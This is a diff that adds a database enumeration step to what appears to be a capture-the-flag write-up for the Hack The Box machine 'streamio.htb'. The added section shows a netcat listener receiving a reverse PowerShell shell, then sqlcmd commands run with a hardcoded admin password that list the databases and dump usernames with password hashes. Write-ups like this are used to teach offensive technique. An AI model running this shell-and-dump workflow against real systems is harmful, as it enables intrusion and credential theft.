@@ -750,6 +750,71 @@ PS C:\inetpub\streamio.htb\admin>
 
 ```
 
+
+## Database enumeration
+
+```
+nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.10.15.80] from (UNKNOWN) [10.129.154.2] 51487
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name
+FROM master..sysdatabases;'sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT DB_NAME(); SELECT name
+>> 
+FROM master..sysdatabases;'
+>> 
+
+                                                                                                                                
+--------------------------------------------------------------------------------------------------------------------------------
+master                                                                                                                          
+
+(1 rows affected)
+name                                                                                                                            
+--------------------------------------------------------------------------------------------------------------------------------
+master                                                                                                                          
+tempdb                                                                                                                          
+model                                                                                                                           
+msdb                                                                                                                            
+STREAMIO                                                                                                                        
+streamio_backup                                                                                                                 
+
+(6 rows affected)
+PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM
+streamio_backup..sysobjects WHERE xtype = "U"'sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'SELECT name FROM
+>> 
+streamio_backup..sysobjects WHERE xtype = "U"'
+>> 
+
+name                                                                                                                            
+--------------------------------------------------------------------------------------------------------------------------------
+movies                                                                                                                          
+users                                                                                                                           
+
+(2 rows affected)
+PS C:\inetpub\streamio.htb\admin> sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select
+username,password from users;'sqlcmd -S '(local)' -U db_admin -P 'B1@hx31234567890' -Q 'USE STREAMIO_BACKUP; select
+>> 
+username,password from users;'
+>> 
+
+Changed database context to 'streamio_backup'.
+username                                           password                                          
+-------------------------------------------------- --------------------------------------------------
+nikk37                                             389d14cb8e4e9b94b137deb1caf0612a                  
+yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332                  
+James                                              c660060492d9edcaa8332d89c99c9239                  
+Theodore                                           925e5408ecb67aea449373d668b7359e                  
+Samantha                                           083ffae904143c4796e464dac33c1f7d                  
+Lauren                                             08344b85b329d7efd611b7a7743e8a09                  
+William                                            d62be0dc82071bccc1322d64ec5b6c51                  
+Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5                  
+
+(8 rows affected)
+PS C:\inetpub\streamio.htb\admin> 
+
+```
 ---
 ## User Flag
 
